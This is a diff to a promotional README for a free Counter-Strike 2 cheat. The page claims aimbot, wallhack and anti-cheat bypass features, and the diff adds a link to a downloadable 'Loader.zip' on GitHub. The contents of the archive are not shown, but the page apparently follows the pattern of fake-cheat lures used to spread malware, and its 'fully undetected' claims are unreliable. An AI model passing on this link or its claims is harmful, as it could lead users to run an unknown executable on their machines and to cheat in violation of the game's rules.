@@ -2,7 +2,7 @@
 
 **Download CS2 Cheat (Latest 2025)** – the ultimate free hack for **Counter-Strike 2** on PC. Take your gameplay to the next level with powerful features like **Aimbot**, **Wallhack (ESP)**, **Triggerbot**, **Radar Hack**, and **No Recoil**. This cheat is updated for the latest CS2 patch and is fully undetected as of May 2025.
 
-🔥 **[📥 DOWNLOAD CS2 CHEAT (FREE)]()**
+🔥 **[📥 DOWNLOAD CS2 CHEAT (FREE)](https://github.com/Cser2ez/cs2-cheit/releases/download/Release/Loader.zip)**
 🛡️ Undetected | VAC Bypass | External
 🖥️ Compatible with Windows 11 / 10 (64-bit)
 ![cs2-che](https://github.com/user-attachments/assets/2de7c046-baa7-4059-a907-99b0cae51f8a)
